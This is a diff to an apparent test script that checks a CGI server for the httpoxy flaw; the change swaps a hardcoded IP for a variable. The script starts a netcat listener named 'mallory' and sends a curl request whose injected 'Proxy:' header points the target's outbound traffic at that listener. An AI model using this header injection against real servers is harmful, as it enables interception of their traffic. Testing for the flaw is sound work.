@@ -75,7 +75,7 @@ echo "Testing: cgi"
 
 echo "" > ./cgi-mallory.log
 nc -v -l 12345 > ./cgi-mallory.log 2>&1 &
-curl -X GET -H "Proxy: 172.17.0.1:$MALLORY_LISTENER_PORT" http://$DOCKER_IP:$TEST_PORT_CGI/httpoxy > ./cgi-curl.log
+curl -X GET -H "Proxy: $DOCKER_HOST_IP:$MALLORY_LISTENER_PORT" http://$DOCKER_IP:$TEST_PORT_CGI/httpoxy > ./cgi-curl.log
 pkill -f 'nc -v -l 12345'
 
 echo
